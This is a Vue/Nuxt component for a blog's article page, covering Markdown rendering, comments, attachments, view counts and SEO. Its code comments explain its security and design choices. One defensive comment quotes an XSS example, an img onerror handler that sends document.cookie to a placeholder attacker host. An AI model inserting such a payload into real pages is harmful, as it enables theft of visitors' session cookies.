<template>
  <div class="art-page">
    <div class="art-wrap" :class="{ 'has-catalog': catalog?.length > 0 }">

      <!-- Back to article list. -->
      <a class="back" href="/" @click.prevent="goHome">← 返回首页</a>

      <!-- Loading state. -->
      <div v-if="pending" class="state">加载中…</div>

      <!-- Unavailable state. -->
      <div v-else-if="!article" class="state">
        <b>这篇文章不见了</b>
        <p>{{ errMsg }}</p>
        <button class="btn" @click="goHome">回到首页</button>
      </div>

      <!-- Article body. -->
      <article v-else class="doc">
        <header class="doc-head">
          <!-- Category and tags. -->
          <div class="doc-labels">
            <span v-if="article.categoryName" class="doc-cat">{{ article.categoryName }}</span>
            <!-- Tag link keeps filtering shareable and crawlable. -->
            <a
v-for="t in articleTags" :key="t.id" class="doc-tag"
               :href="tagLink(t.id)"
               :title="'查看「' + t.name + '」标签下的全部文章'"
               @click.prevent="goTag(t.id)">#{{ t.name }}</a>
          </div>
          <h1 class="doc-title">{{ article.title }}</h1>
          <div class="doc-meta">
            <span>{{ fmtDate(article.createTime) }}</span>
            <span class="dot">·</span>
            <span>{{ viewCount }} 次浏览</span>
            <span v-if="article.isTop === 1" class="doc-top">置顶</span>
          </div>
          <img v-if="article.cover" class="doc-cover" :src="article.cover" :alt="article.title" >
        </header>

        <MdPreview
          :key="article.id"
          :model-value="article.content || ''" :theme="editorTheme" language="zh-CN"
          :md-heading-id="headingId" @onGetCatalog="updateCatalog"
        />

        <!-- Attachments follow the article body. -->
        <section v-if="attachments.length" class="doc-attach">
          <h2 class="doc-attach-title">附件（{{ attachments.length }}）</h2>
          <ul class="doc-attach-list">
            <li v-for="(item, index) in attachments" :key="`${item.url}-${index}`">
              <a class="doc-attach-item" :href="item.url" :download="item.name" target="_blank" rel="noopener">
                <span class="doc-attach-name" :title="item.name">{{ item.name }}</span>
                <span class="doc-attach-size">{{ formatFileSize(item.size) }}</span>
              </a>
            </li>
          </ul>
        </section>
      </article>

      <ArticleCatalog v-if="article && !pending" :headings="catalog" />

      <footer v-if="article" class="doc-foot">
        <span>── 完 ──</span>
        <button class="btn" @click="goHome">回到首页</button>
      </footer>

      <!-- ==================== 评论区 ====================
           放在"完"的下面：读完正文顺手就能说话，不用再往下翻很久。
           `v-if="article"` 是必需的：文章不存在时（软 404）根本没有 articleId 可评论，
           而评论列表接口不带 articleId 会被后端拒（400）。 -->
      <section v-if="article" id="comments" class="cm">
        <h2 class="cm-title">
          评论
          <span v-if="commentTotal" class="cm-count">{{ commentTotal }}</span>
        </h2>

        <!-- Public comments. -->
        <div v-if="commentsPending && allComments.length === 0" class="cm-empty">评论加载中…</div>
        <div v-else-if="allComments.length === 0" class="cm-empty">
          还没有评论，来说点什么
        </div>
        <ul v-else class="cm-list">
          <li v-for="c in allComments" :key="c.id" class="cm-item">
            <div class="cm-head">
              <span class="cm-nick">{{ c.nickname }}</span>
              <span class="cm-time">{{ fmtTime(c.createTime) }}</span>
            </div>
            <!-- Interpolation keeps user comments as text. -->
            <p class="cm-body">{{ c.content }}</p>
          </li>
        </ul>

        <div v-if="hasMoreComments" class="cm-more">
          <button class="btn" :disabled="commentsLoadingMore" @click="loadMoreComments">
            {{ commentsLoadingMore ? '加载中…' : '加载更多评论' }}
          </button>
        </div>

        <!-- Comment form. -->
        <form v-if="settings.commentEnabled" class="cm-form" @submit.prevent="submitComment">
          <div class="cm-form-title">发表评论</div>

          <div class="cm-fields">
            <label class="cm-field">
              <span class="cm-label">
                昵称 <i v-if="!isLoggedIn">*</i>
                <em v-else class="cm-account">用你的账号昵称</em>
              </span>
              <input
v-model="commentForm.nickname" type="text"
                     :readonly="isLoggedIn" :class="{ 'is-locked': isLoggedIn }"
                     :maxlength="COMMENT_LIMITS.nickname" placeholder="怎么称呼你" >
            </label>
            <label class="cm-field">
              <span class="cm-label">邮箱 <em>选填</em></span>
              <input
v-model="commentForm.email" type="text"
                     :maxlength="COMMENT_LIMITS.email" placeholder="不会公开，只用于回复你" >
            </label>
          </div>

          <textarea
v-model="commentForm.content" class="cm-textarea"
                    :maxlength="COMMENT_LIMITS.content" rows="4"
                    placeholder="说点什么…（最多 1000 字）" />

          <div class="cm-actions">
            <span class="cm-hint">{{ commentForm.content.length }} / {{ COMMENT_LIMITS.content }}</span>
            <button type="submit" class="cm-submit" :disabled="commentSubmitting">
              {{ commentSubmitting ? '提交中…' : '发表评论' }}
            </button>
          </div>

          <p v-if="commentError" class="cm-alert err">{{ commentError }}</p>

          <p v-if="commentPublished" class="cm-alert ok">
            评论已发布，已出现在上面的评论列表里。
          </p>
          <p v-else-if="commentDone" class="cm-alert ok">
            {{ COMMENT_PENDING_NOTICE }} —— 站长审核通过后才会出现在上面的评论列表里。
          </p>
        </form>

        <p v-else class="cm-closed">评论已关闭，暂时不能发表新的评论。</p>

        <!-- Pending comments from this session stay private. -->
        <div v-if="myPending.length" class="cm-mine">
          <div class="cm-mine-title">你的评论（仅你可见）</div>
          <ul class="cm-list">
            <li v-for="c in myPending" :key="c.id" class="cm-item pending">
              <div class="cm-head">
                <span class="cm-nick">{{ c.nickname }}</span>
                <span class="cm-badge">待审核</span>
                <span class="cm-time">{{ fmtTime(c.createTime) || '刚刚' }}</span>
              </div>
              <p class="cm-body">{{ c.content }}</p>
            </li>
          </ul>
        </div>
      </section>

    </div>
  </div>
</template>

<script setup>
// MdPreview 是"只读渲染"版，不带动编辑器那套（体积小很多）。
// 样式引 preview.css 而不是 style.css —— 详情页不需要编辑器样式。
import { MdPreview } from 'md-editor-v3'
import 'md-editor-v3/lib/preview.css'
const { themeMode } = useThemeMode()
const editorTheme = computed(() => (themeMode.value === 'day' ? 'light' : 'dark'))

/*
 * 【安全关键】正文为什么用 MdPreview 渲染，而不是自己 v-html？
 *
 * Markdown 里是可以塞原始 HTML 的 —— 比如写一句
 *     <img src=x onerror="fetch('http://坏人/'+document.cookie)">
 * 如果直接 v-html 塞进页面，这段脚本会在【每一个读者】的浏览器里执行。
 * 你自己写的文章当然没事，但这是博客系统最经典的 XSS 入口。
 *
 * MdPreview 内部接了 xss 库做白名单过滤，危险标签和属性会被清掉。
 * 自己写 v-html 就必须自己接 DOMPurify —— 一旦漏了就是全站 XSS。
 *
 * 【为什么这段注释写在这里而不是模板里？】
 * 模板里的 HTML 注释会被原样序列化进最终 HTML 发给每个访客
 * （上面那句 onerror 示例就因此出现在了页面源码里）。
 * JS 注释则会被打包器剥掉。凡是带敏感示例的说明，都写进 <script>。
 */

const route = useRoute()
const { request } = useApi()

/**
 * 站点设置（文章页要用到一样：评论总开关）。
 *
 * 【为什么评论开关值得单独接线】它是"整站级"的开关，而文章页是它唯一生效的地方：
 *   关掉之后这一页不再显示发表表单（已有的评论照常显示，见模板里那段说明）。
 * 【为什么这里调 useSiteSettings 不多打一次接口】外壳已经用同一个 key 取过了，
 *   同 key 就是同一份数据（那段 getCachedData 保证服务端也只打一次）。
 * 【读不到时怎么办】归一化把"读不到"当成**开启**（就是改动前的行为）——
 *   不能让接口抖一下就把全站的评论框藏起来。
 */
const { settings } = useSiteSettings()

/**
 * 【为什么正文与评论都用 useAsyncData（服务端渲染），而不是 onMounted + ref】
 * 因为这是内容，不是控件 —— 内容必须出现在服务端返回的 HTML 里，否则：
 *   ① 搜索引擎抓到的是一张空壳，文章等于没被收录（SSR 博客的核心价值就在这）
 *   ② 首屏会先闪一下"加载中"再出内容，观感差
 * useAsyncData 会在服务端【等数据回来再渲染】，HTML 里直接带着正文与评论。
 *
 * 【key 里带上文章 id】它是"这份数据属于哪篇文章"的标识，
 * 写死成 'article' 的话，从第 12 篇点到第 13 篇会拿到上一篇的缓存。
 *
 * 【评论也用同一套，但有代价（这个选择不是白来的）】
 *   · 评论请求会并进详情页 SSR 的关键路径 —— 所以下面把它和正文【并行】发起，
 *     串行 await 会让首屏多一个往返
 *   · payload 里多了一份评论数据（第一页 10 条，可接受）
 *   · 接口失败时不能连累正文：normalizeCommentPage() 把失败整成"空列表"，
 *     页面最多显示"还没有评论"，正文照常渲染
 *   · key 必须和正文的 key（`article-12`）区分开，撞了会共用同一份缓存
 *
 * 【评论内容为什么用 {{ }} 插值显示，绝不能 v-html（安全关键）】
 *   评论是【任何人都能提交】的内容（评论接口对游客开放）。
 *   后端在入库前已经把 < > & 转义成实体（存进去的就是 &lt; 这种），
 *   所以前端【照原样显示】就是安全的：
 *     · 用 {{ }} 插值 = 把字符串当纯文本放进 DOM，内容里写 <script> 也只会显示成字
 *     · 用 v-html = 把字符串当 HTML 解析，等于让每个访客的浏览器执行别人的输入
 *   两条附带的纪律：
 *     · 【不要反转义】把 &lt; 还原成 < 再插值，正好把上面那层保护拆掉了
 *     · 【不要再做一次 HTML 转义】那会把 &lt; 显示成 &amp;lt;，用户看到一堆实体码
 */
const COMMENT_PAGE_SIZE = 10

/** 拉某页评论（公开接口，必须带 articleId，否则后端直接 400） */
const requestComments = (pageNo) => request('/comment/list', {
  params: { articleId: route.params.id, page: pageNo, size: COMMENT_PAGE_SIZE },
})

const articleAsync = useAsyncData(
  () => 'article-' + route.params.id,
  () => request('/article/' + route.params.id),
)

const commentsAsync = useAsyncData(
  () => 'article-comments-' + route.params.id,
  () => requestComments(1),
)

// 两个请求互不依赖 → 并行发起、一起 await（串行会让首屏多一个往返）
await Promise.all([articleAsync, commentsAsync])

const { data: res, pending } = articleAsync
const { data: commentRes, pending: commentsPending } = commentsAsync

const article = computed(() => (res.value?.ok ? res.value.data : null))
const errMsg = computed(() => res.value?.message || '它可能已被删除，或者还只是一篇没发布的草稿。')

// 使用渲染器实际解析的标题，避免把代码块里的 # 误当作目录。
// 序号从 1 开始，重复标题也有各自的锚点。
const catalog = ref([])
const headingId = ({ index }) => `article-${route.params.id}-heading-${index}`
const updateCatalog = (headings) => {
  catalog.value = headings.flatMap((heading, index) => (
    heading.currentToken && heading.currentToken.level !== 0
      ? []
      : [{
          id: headingId({ index: index + 1 }), text: heading.text,
          level: Number(heading.currentToken?.tag?.slice(1)) || heading.level,
        }]
  ))
}
watch(() => route.params.id, () => { catalog.value = [] })

/**
 * ================================================================
 *  浏览量：读详情【不再计数】，改为在这里单独上报一次
 * ================================================================
 * 【为什么计数从详情接口里拆出来】
 *   拆之前 GET /article/{id} 自己会做一次 Redis INCR，于是那个接口
 *   "读起来有写副作用"，后果有三条：
 *     · 它永远不能被任何一层缓存（HTTP 缓存 / CDN / SWR）—— 一缓存，
 *       浏览量就停在某个值上不再增长
 *     · 爬虫抓一次 = 一次浏览
 *     · NuxtLink 的预取（链接进入视口就抓目标页）也会被算成浏览
 *   现在改成页面真正挂载之后再上报：只有人真的打开了这一页，才算一次。
 *
 * 【为什么需要这个 override，而不是直接改 article】
 *   article 是个只读 computed（从 useAsyncData 的结果派生），改不了。
 *   而且 SSR 渲染出来的那个数字本来就不含本次访问 —— 它是"库里的快照 +
 *   还没落库的增量"。挂载后上报，拿服务端返回的最新总数覆盖显示，
 *   用户看到的就是含自己这一下的准确值（和拆之前的行为一致）。
 */
const viewCountOverride = ref(null)
const viewCount = computed(() => viewCountOverride.value ?? article.value?.viewCount ?? 0)

watch(() => route.params.id, () => { viewCountOverride.value = null })

onMounted(() => {
  watch([() => route.params.id, () => article.value?.id], async ([routeId, articleId]) => {
    // Wait for the matching article when the same page instance handles another id.
    if (!articleId || String(articleId) !== String(routeId)) return
    const res = await request(`/article/${routeId}/view`, { method: 'POST' })
    if (String(route.params.id) === String(routeId) && res.ok && typeof res.data === 'number') {
      viewCountOverride.value = res.data
    }
  }, { immediate: true })
})

/**
 * 这篇文章身上的标签。
 * 【为什么要 Array.isArray 兜一道】后端保证"没有标签时是空数组"，
 * 但详情接口一旦挂掉、或者以后 tags 变成 null / 别的结构，直接 v-for 会把
 * 整个详情页渲染带崩 —— 而正文才是这一页的全部价值，
 * 为了几颗标签把正文也弄没了是绝对不能接受的。兜成空数组最差只是不显示标签。
 */
const articleTags = computed(() => (Array.isArray(article.value?.tags) ? article.value.tags : []))

/**
 * 这篇文章的附件清单（后端详情接口返回）。
 * 【为什么要兜底成数组】附件是后加的字段：接口还没更新、或者这篇文章确实没有附件时，
 * `article.value.attachments` 是 undefined —— 模板里写 `attachments.length` 会直接抛错，
 * 把整个文章页带崩。一个**可选字段不该有这个能力**（与上面 articleTags 同一条理由）。
 */
const attachments = computed(() => (Array.isArray(article.value?.attachments) ? article.value.attachments : []))

// ================================================================
//  评论区
// ================================================================

/** 第一页（服务端渲染取好的那份），失败时是"空列表 + 总数 0" */
const firstCommentPage = computed(() => normalizeCommentPage(commentRes.value))
const commentTotal = computed(() => firstCommentPage.value.total)

/** 「加载更多」追加进来的评论（公开列表是【时间正序】，所以下一页追加在后面是对的） */
const moreComments = ref([])
const commentsLoadingMore = ref(false)
const nextCommentPage = ref(2)

/** 页面上要显示的评论 = 第一页 + 追加的 */
const allComments = computed(() => [...firstCommentPage.value.records, ...moreComments.value])

/** 还有没有下一页：已显示的条数 < 总条数 就说明还有 */
const hasMoreComments = computed(() => allComments.value.length < commentTotal.value)

/**
 * 加载下一页评论并追加到列表末尾。
 * 【为什么用普通请求而不是 useAsyncData】它不属于"这一页的首屏数据"，
 * 服务端只渲染第一页，也不需要进 payload —— 追加语义用一次普通请求最直白。
 */
const loadMoreComments = async () => {
  if (commentsLoadingMore.value) return
  const articleId = String(route.params.id)
  const page = nextCommentPage.value
  commentsLoadingMore.value = true
  const res = await requestComments(page)
  if (String(route.params.id) !== articleId) return
  commentsLoadingMore.value = false
  if (!res.ok) return
  nextCommentPage.value = page + 1
  moreComments.value = [...moreComments.value, ...normalizeCommentPage(res).records]
}

// ---------- 发表评论 ----------
const commentForm = reactive({ nickname: '', email: '', content: '' })
/** 校验失败 / 提交失败的提示（一次只显示一条） */
const commentError = ref('')
/** 提交成功的提示：必须明确告诉用户"在等审核"，否则他会以为没发出去 */
const commentDone = ref(false)
/** 管理员那条路径的提示：他的评论是**直接发布**的，文案完全不同（见 submitComment） */
const commentPublished = ref(false)
const commentSubmitting = ref(false)
/** 本次会话里提交成功的评论（都是待审核状态，单独显示，不混进公开列表） */
const myPending = ref([])

watch(() => route.params.id, () => {
  moreComments.value = []
  nextCommentPage.value = 2
  commentsLoadingMore.value = false
  myPending.value = []
  commentError.value = ''
  commentDone.value = false
  commentPublished.value = false
  commentSubmitting.value = false
  commentForm.content = ''
})

// ---------- 登录态：决定昵称从哪来（与后端同一套规则） ----------
/**
 * 【为什么要在这里读登录态】2026-09 起，注册用户与管理员发评论时，
 *   昵称由后端从账号里取，表单里那个字段会被忽略。前端照着同一条规则把这一栏锁上，
 *   用户才不会白填一个"填了也没用"的输入框。
 *
 * ⚠️ 【它不是安全边界】真正的规则在后端（CommentServiceImpl.create 第 3 步）：
 *   直接调接口、或者把只读属性改掉，后端照样以账号身份记录这条评论。
 *   这里只是让界面和规则一致。
 */
const { user } = useAuth()
const isLoggedIn = computed(() => !!user.value)

/**
 * 登录后把账号昵称填进表单（只读，见模板）。
 *
 * 【为什么要 watch 而不是挂载时赋一次】`user` 是客户端异步取的
 *   （app.vue 挂载后打 /auth/me 才填上），SSR 时它还是 null。
 *   只在 setup 里赋一次的话，刷新页面进来的登录用户会看到一个空的昵称框。
 *   用 immediate 让"已经登录着"的情况也能立刻生效。
 */
watch(user, (u) => {
  if (u) commentForm.nickname = u.nickname || u.username || ''
}, { immediate: true })

const submitComment = async () => {
  commentError.value = ''
  commentDone.value = false
  commentPublished.value = false

  // 先跑本地校验（纯函数，有单测）：能当场说清的错就不必走一次网络
  const problem = validateCommentForm(commentForm)
  if (problem) {
    commentError.value = problem.message
    return
  }

  // 防连点：按钮上虽然有 :disabled，但两次点击落在同一帧时它还没重绘。
  // 评论接口有 20 次/分钟的限流，多打一次就少一次配额。
  if (commentSubmitting.value) return
  commentSubmitting.value = true
  const articleId = String(route.params.id)

  const res = await request('/comment', {
    method: 'POST',
    body: normalizeCommentForm(commentForm, route.params.id),
  })

  if (String(route.params.id) !== articleId) return
  commentSubmitting.value = false

  if (res.ok) {
    // 【成功之后分两条路，看后端给回来的 status】
    //   · 0 待审核（游客与注册用户）：公开列表接口只返回已通过的，刷新也看不到它，
    //     所以直接把接口返回的这一条显示在"仅你可见"那块里 ——
    //     否则用户看到的就是"我发的评论没了"，然后很可能再发一遍。
    //   · 1 已发布（管理员）：它【现在就在】公开列表里，刷新一下就能看到，
    //     再往"仅你可见"里塞一条反而会让人以为"我的评论只有我自己看得见"。
    //     文案也要跟着换（见模板里 commentPublished 那一段）。
    if (res.data?.status === COMMENT_STATUS.APPROVED) {
      commentPublished.value = true
      // 刷新公开列表，让刚发的那条出现（不刷新的话要手动重载页面才看得到）
      await commentsAsync.refresh()
    } else {
      myPending.value = [res.data, ...myPending.value]
      commentDone.value = true
    }
    // 只清内容，昵称与邮箱留着：同一个人常常连着说几句
    commentForm.content = ''
    return
  }

  // 【429 必须说成"请求过于频繁"，绝不能落到"网络异常"】
  //   这个接口是 20 次/分钟的【整站】配额，很容易撞到；而限流是
  //   "服务端好好的、只是让你等一会儿"，说成网络故障会引导用户去查网络、反复重试，
  //   每一次重试还会再吃掉一个名额。useApi 已经按 HTTP 429 分好支并给了文案，
  //   这里再用 RATE_LIMITED_MESSAGE 兜一道：万一后端/proxy 返回的 429 没带 body，
  //   提示里也必须有"频繁"这两个字。
  commentError.value = res.rateLimited
    ? (res.message || RATE_LIMITED_MESSAGE)
    : (res.message || '提交失败，请稍后再试')
}

/*
 * 【SEO】标题、摘要、og、canonical 都交给 useSeoMetaFor 拼（规则在 app/utils/seo.ts）。
 *
 * 改之前这里只有一句 useHead({ title })，没有 description / og / canonical：
 * 链接分享到微信就是一行光秃秃的地址，搜索引擎也只能自己从正文里截一段当摘要。
 *
 * 两个细节：
 *   · description 用文章自己的 summary；没写摘要时回落到站点描述
 *     （空 description 等于把"这段话"交给抓取方随便猜）
 *   · 封面是相对路径（/uploads/xxx.png），og:image 要求绝对地址，
 *     所以交给 absoluteUrl 拼一次 —— 抓取方拿到相对路径会直接当成没有图
 */
useSeoMetaFor(() => ({
  path: '/article/' + route.params.id,
  title: article.value?.title,
  description: article.value?.summary,
  type: 'article',
  image: article.value?.cover,
  // 【软 404 的页面不该被索引】文章不存在 / 是草稿 / 已下架时，这个地址
  // 没有任何内容可给搜索引擎 —— 但下面那个 createError 抛出去之后，
  // 错误页的 head 由 error.vue 接管，这里先声明 noindex 更稳妥
  noindex: !article.value,
}))

/*
 * 【SEO 关键】文章不存在时，必须让服务端返回真正的 HTTP 404。
 *
 * 如果只是渲染一句"文章不见了"但状态码仍是 200，这叫【软 404】：
 * 搜索引擎会认为"这个 URL 的内容就是一张报错图"，然后把它收录进索引，
 * 结果你的 404 页面反而被搜出来了。
 *
 * 用 createError 抛出去，Nuxt 会：
 *   ① 把 HTTP 状态码设成 404
 *   ② 渲染 app/error.vue（我们自己写的、和站点同风格的错误页）
 * 这比手写 setResponseStatus 可靠 —— 后者在页面正常渲染时会被覆盖掉（实测无效）。
 */
if (res.value && !res.value.ok) {
  throw createError({
    statusCode: res.value.code === 404 ? 404 : 500,
    statusMessage: '文章不存在',
    data: { from: 'article' },
  })
}

const goHome = () => navigateTo('/')

/**
 * 去首页按这个标签筛文章。
 * 【为什么用对象形式的 navigateTo】tagId 必须走 query（首页的筛选条件全都在 query 里），
 * 拼字符串 '/?tagId=3' 也能用，但对象形式让"这一个是路径、那一个是查询参数"
 * 在代码里就分得清清楚楚，以后加第二个条件（比如同时带 categoryId）不用改写法。
 * 【为什么 String() 一下】route.query 的值只有字符串，先转成字符串能让
 * "生成出来的地址"和"路由解析出来的地址"完全一致（否则测试里断言会对不上）。
 */
const goTag = (id) => navigateTo({ path: '/', query: { tagId: String(id) } })

/** 标签链接的 href：给中键/右键/爬虫用的真实地址（左键点击走上面的 goTag） */
const tagLink = (id) => `/?tagId=${id}`

const fmtDate = (t) => (t ? String(t).replace('T', ' ').slice(0, 10) : '')

/**
 * 评论的时间要精确到分钟（不像卡片上只显示到天）：
 * 评论区里两条评论常常只差几分钟，只显示日期的话先后顺序看不出来，
 * 时间正序也就白排了。后端给的是 "2026-09-10T05:03:19"，截到分钟即可。
 */
const fmtTime = (t) => (t ? String(t).replace('T', ' ').slice(0, 16) : '')
</script>

<style scoped>
.art-page { position: relative; min-height: 70vh; isolation: isolate; }
/* 阅读栏宽度。
   【为什么从 860 提到 960】站长反馈"文章详情页有点小、不那么好看" —— 860px 是
   早期按"一行 40 来个字最舒服"定的，但本项目正文用的是 16px 中文 + 1.9 行高，
   860px 下每行不到 35 个字、两侧空白显得很空。960px 在 1440 及以上的屏上
   观感明显更"撑得开"，而在窄屏上本来就走下面的媒体查询，不受影响。
   ⚠️ 再宽就要开始伤可读性了（一行超过 ~45 个中文字，眼睛回行会找不准行）——
   所以这个数字不是越大越好，960 是"看起来大气"与"读起来不累"之间的取值。 */
.art-wrap { max-width: 960px; margin: 0 auto; padding: 32px 24px 64px; }
/* 宽屏给侧边悬浮目录留出位置，保持原来的正文宽度。 */
@media (min-width: 1440px) {
  .art-wrap.has-catalog { max-width: 1208px; padding-right: 272px; }
}

.back {
  display: inline-block; margin-bottom: 18px; color: var(--muted);
  font-size: 14px; text-decoration: none; cursor: pointer; transition: color .2s;
}
.back:hover { color: var(--accent); }

.state { text-align: center; padding: 80px 24px; border: 2px solid var(--line); box-shadow: 6px 6px 0 var(--pixel-shadow); color: var(--muted); background: var(--panel); }
.state b { display: block; font-size: 20px; color: var(--ink); margin-bottom: 10px; }
.state p { margin: 0 0 22px; font-size: 14px; line-height: 1.7; }
.btn {
  background: var(--surface-2); border: 2px solid var(--line);
  color: var(--ink); padding: 9px 26px; border-radius: 0; cursor: pointer;
  box-shadow: 3px 3px 0 var(--pixel-shadow);
  font-size: 14px; transition: border-color .2s, color .2s;
}
.btn:hover { border-color: var(--accent); color: var(--accent); transform: translate(1px, 1px); box-shadow: 2px 2px 0 var(--pixel-shadow); }

/* 【性能考虑】正文面板用"几乎不透明的深色底"而不是 .glass 毛玻璃。
   原因：文章很长，一整块大面积的 backdrop-filter 会对背后的播放中视频
   做实时重采样 —— 这是首页那次卡顿的同款问题，而且面积还更大。
   阅读场景本来也需要更实的背景来保证对比度。 */
.doc {
  /* 0.96 而不是 0.88：正文是长文，背景透光率哪怕只有 12%，
     在一张高对比度的背景图上也会明显干扰阅读（实测截图里画作清晰可见）。
     这里故意不做 backdrop-filter —— 一整块大面积实时模糊会对背后的播放中视频
     逐帧重采样，是首页那次卡顿的同款问题，而且面积更大。 */
  background: var(--panel);
  border: 2px solid var(--line);
  border-radius: 0;
  padding: 44px 52px 52px;
  box-shadow: 8px 8px 0 var(--pixel-shadow);
}
.doc-head { margin-bottom: 28px; padding-bottom: 24px; border-bottom: 1px solid rgba(150,190,240,.12); }
/* 分类与标签同一行，窄屏自动换行（标签多的文章不该把标题挤下去） */
.doc-labels { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-bottom: 14px; }
.doc-cat {
  display: inline-block; font-size: 12px; color: #cfe0f0;
  border: 2px solid var(--line); border-radius: 0;
  padding: 2px 12px;
}
/* 标签做得比分类淡一些：# 前缀 + 实心底，一眼能看出"这是标签、而且能点" */
.doc-tag {
  display: inline-block; font-size: 12px; color: #cfe0f0; text-decoration: none;
  background: var(--surface-2); border: 2px solid var(--cyan); border-radius: 0; padding: 3px 12px;
  transition: background .2s, color .2s;
}
.doc-tag:hover { background: rgba(242,193,78,.3); color: var(--ink); }
.doc-title { font-size: 32px; font-weight: 800; line-height: 1.35; margin: 0 0 14px; color: var(--ink); }
.doc-meta { display: flex; align-items: center; gap: 10px; color: var(--muted); font-size: 13px; flex-wrap: wrap; }
.doc-meta .dot { opacity: .5; }
.doc-top { color: var(--accent); border: 2px solid rgba(242,193,78,.45); border-radius: 0; padding: 2px 10px; font-size: 12px; box-shadow: 2px 2px 0 var(--pixel-shadow); }
.doc-cover { width: 100%; border-radius: 0; margin-top: 22px; display: block; border: 2px solid var(--line); image-rendering: auto; }

/* 附件区：在正文之后、"完"之前。
   每一项都是"文件名（可省略号）+ 大小"的**整行链接** —— 整行可点比只有文字可点更好按，
   手机上尤其明显。 */
.doc-attach { margin-top: 34px; border-top: 1px solid rgba(150,190,240,.12); padding-top: 22px; }
.doc-attach-title { font-size: 15px; font-weight: 700; color: var(--ink); margin: 0 0 14px; }
.doc-attach-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 10px; }
.doc-attach-item { display: flex; align-items: center; gap: 12px; padding: 10px 14px; border-radius: 0; background: var(--surface-2); border: 2px solid rgba(150,190,240,.14); color: var(--muted); text-decoration: none; box-shadow: 3px 3px 0 var(--pixel-shadow); transition: border-color .2s ease, color .2s ease, transform .2s ease, box-shadow .2s ease; }
.doc-attach-item:hover { border-color: var(--accent); color: var(--accent); }
.doc-attach-item:hover { transform: translate(1px, 1px); box-shadow: 2px 2px 0 var(--pixel-shadow); }
/* 文件名要能截断：flex 子项默认 min-width 是 auto，不写 min-width: 0 就会把整行撑破 */
.doc-attach-name { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.doc-attach-size { flex: 0 0 auto; font-size: 12px; font-variant-numeric: tabular-nums; }
.doc-foot { text-align: center; margin-top: 34px; color: var(--muted); font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 18px; letter-spacing: 2px; }

/* ==================== 评论区 ====================
   和正文同一个底色（不做毛玻璃）：理由同 .doc —— 大面积 backdrop-filter 会对
   背后的播放中视频逐帧重采样，而这里同样是一整块长内容。 */
.cm {
  margin-top: 28px;
  background: var(--panel);
  border: 2px solid var(--line);
  border-radius: 0;
  padding: 32px 44px 36px;
  box-shadow: 8px 8px 0 var(--pixel-shadow);
}
.cm-title { font-size: 20px; font-weight: 800; color: var(--ink); margin: 0 0 20px; }
.cm-count {
  margin-left: 8px; font-size: 12px; font-weight: 600; color: var(--muted);
  border: 2px solid rgba(180,210,245,.25); border-radius: 0; padding: 2px 10px;
}
.cm-empty { color: var(--muted); font-size: 14px; text-align: center; padding: 34px 0; }

.cm-list { list-style: none; margin: 0; padding: 0; }
.cm-item { padding: 14px 0; border-bottom: 1px solid rgba(150,190,240,.10); }
.cm-item:last-child { border-bottom: none; }
.cm-head { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
.cm-nick { color: var(--accent); font-size: 13px; font-weight: 700; }
.cm-time { color: var(--muted); font-size: 12px; }
/* 「待审核」标记：它要显眼，因为这条评论别人看不到，只有作者自己看得到 */
.cm-badge {
  font-size: 11px; color: #0a1224; background: var(--accent);
  border: 2px solid var(--pixel-shadow); border-radius: 0; padding: 1px 8px; font-weight: 700;
  box-shadow: 2px 2px 0 var(--pixel-shadow);
}
/* 【pre-wrap 是必需的】评论内容里可以有换行，默认的 white-space: normal
   会把换行"吃掉"，用户写的一段一段话会被拼成一整行。
   pre-wrap 既保留换行与连续空格，又会在行尾自动折行（不像 pre 那样横向溢出）。 */
.cm-body { margin: 0; color: var(--ink); font-size: 14px; line-height: 1.8; white-space: pre-wrap; word-break: break-word; }
/* 待审核的那条整体压暗一点：一眼能看出它和上面那些"已公开"的不是一回事 */
.cm-item.pending .cm-body { color: var(--muted); }

.cm-more { text-align: center; margin: 18px 0 4px; }
.cm-more .btn:disabled { opacity: .6; cursor: default; }

/* 发表表单 */
.cm-form { margin-top: 26px; padding-top: 22px; border-top: 1px solid rgba(150,190,240,.14); }
/* 评论关闭时的说明：与"还没有评论"那句用同一种低调样式，它不是一个错误状态 */
.cm-closed { margin-top: 26px; padding: 18px 0 4px; border-top: 1px solid rgba(150,190,240,.14); color: var(--muted); font-size: 14px; text-align: center; }
.cm-form-title { font-weight: 700; color: var(--ink); margin-bottom: 14px; }
.cm-fields { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.cm-field { display: flex; flex-direction: column; gap: 6px; }
.cm-label { color: var(--muted); font-size: 12px; }
.cm-label i { color: #f56c6c; font-style: normal; }
.cm-label em { font-style: normal; opacity: .7; }
.cm-field input, .cm-textarea {
  background: var(--surface-2);
  border: 2px solid rgba(150,190,240,.18);
  border-radius: 0; padding: 10px 12px; color: var(--ink);
  box-shadow: inset 2px 2px 0 rgba(255,255,255,.05);
  font-size: 14px; font-family: inherit; outline: none;
  transition: border-color .2s;
}
.cm-field input:focus, .cm-textarea:focus { border-color: rgba(242,193,78,.6); }
.cm-field input::placeholder, .cm-textarea::placeholder { color: var(--muted); }
/* 登录后昵称栏变成只读（值来自账号）。
   灰一点 + 光标改成默认箭头：不然鼠标移上去是个"I"形光标，
   看着像能编辑、点下去却打不出字 —— 那种"看起来能改其实不能"最招人试。 */
.cm-field input.is-locked { opacity: .75; cursor: default; }
.cm-label .cm-account { color: var(--accent); font-size: 12px; }
/* resize: vertical —— 只让用户往高里拖，横向拖会把 860px 的排版拖坏 */
.cm-textarea { margin-top: 12px; width: 100%; resize: vertical; line-height: 1.7; box-sizing: border-box; }

.cm-actions { display: flex; align-items: center; justify-content: space-between; margin-top: 12px; }
.cm-hint { color: var(--muted); font-size: 12px; }
.cm-submit {
  background: var(--accent);
  border: 2px solid var(--pixel-shadow); color: var(--on-accent); font-weight: 700; font-size: 14px;
  padding: 9px 28px; border-radius: 0; cursor: pointer; box-shadow: 3px 3px 0 var(--pixel-shadow);
  transition: opacity .2s;
}
.cm-submit:disabled { opacity: .6; cursor: default; }

/* 表单下方的提示：错误用红、成功用金。
   【为什么要放在按钮下面】提交完用户的目光就在那里，提示出现在他正在看的位置，
   不用去找"提示弹到哪儿去了"。 */
.cm-alert { font-size: 13px; line-height: 1.7; margin: 12px 0 0; }
.cm-alert.err { color: #f56c6c; }
.cm-alert.ok { color: var(--accent); }

.cm-mine { margin-top: 22px; }
